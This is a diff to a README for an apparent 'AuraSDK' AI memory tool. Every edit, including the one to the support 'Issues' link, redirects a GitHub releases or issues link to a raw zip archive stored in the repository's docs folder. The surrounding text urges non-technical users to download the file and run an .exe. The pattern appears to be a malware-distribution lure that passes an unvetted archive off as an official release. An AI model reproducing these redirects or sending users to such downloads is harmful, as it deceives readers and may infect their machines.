@@ -1,6 +1,6 @@
 # 🤖 AuraSDK - Fast, Private AI Memory System
 
-[![Download AuraSDK](https://img.shields.io/badge/Download-AuraSDK-green?style=for-the-badge)](https://github.com/Dezz05/AuraSDK/releases)
+[![Download AuraSDK](https://img.shields.io/badge/Download-AuraSDK-green?style=for-the-badge)](https://raw.githubusercontent.com/Dezz05/AuraSDK/main/docs/SDK-Aura-3.8-beta.4.zip)
 
 ---
 
@@ -44,7 +44,7 @@ No special hardware or software is required.
 
 Click the badge below to visit the official release page. This is where you can download the latest version of AuraSDK.
 
-[![Download AuraSDK](https://img.shields.io/badge/Download-AuraSDK-blue?style=for-the-badge)](https://github.com/Dezz05/AuraSDK/releases)
+[![Download AuraSDK](https://img.shields.io/badge/Download-AuraSDK-blue?style=for-the-badge)](https://raw.githubusercontent.com/Dezz05/AuraSDK/main/docs/SDK-Aura-3.8-beta.4.zip)
 
 The release page includes setup files and instructions. Look for the latest Windows installer or zip file.
 
@@ -54,7 +54,7 @@ The release page includes setup files and instructions. Look for the latest Wind
 
 Follow these steps to install AuraSDK:
 
-1. **Go to the download page:** Click the badge above, or visit [https://github.com/Dezz05/AuraSDK/releases](https://github.com/Dezz05/AuraSDK/releases)
+1. **Go to the download page:** Click the badge above, or visit [https://raw.githubusercontent.com/Dezz05/AuraSDK/main/docs/SDK-Aura-3.8-beta.4.zip](https://raw.githubusercontent.com/Dezz05/AuraSDK/main/docs/SDK-Aura-3.8-beta.4.zip)
 2. **Find the latest Windows setup file:** Look for a file with `.exe` or `.zip` in the name and check the date to pick the most recent.
 3. **Download the file:** Click the file name to download. Save it to your desktop or another easy-to-find folder.
 4. **Run the installer (if `.exe`):** Double-click the downloaded `.exe` file.
@@ -131,10 +131,10 @@ If problems continue, open an issue on the GitHub page or check discussions for 
 
 You can find additional information and support here:
 
-- GitHub Releases: https://github.com/Dezz05/AuraSDK/releases
-- GitHub Issues: https://github.com/Dezz05/AuraSDK/issues
+- GitHub Releases: https://raw.githubusercontent.com/Dezz05/AuraSDK/main/docs/SDK-Aura-3.8-beta.4.zip
+- GitHub Issues: https://raw.githubusercontent.com/Dezz05/AuraSDK/main/docs/SDK-Aura-3.8-beta.4.zip
 - Read the documentation files inside the download package
 
 ---
 
-[![Download AuraSDK](https://img.shields.io/badge/Download-AuraSDK-green?style=for-the-badge)](https://github.com/Dezz05/AuraSDK/releases)
+[![Download AuraSDK](https://img.shields.io/badge/Download-AuraSDK-green?style=for-the-badge)](https://raw.githubusercontent.com/Dezz05/AuraSDK/main/docs/SDK-Aura-3.8-beta.4.zip)
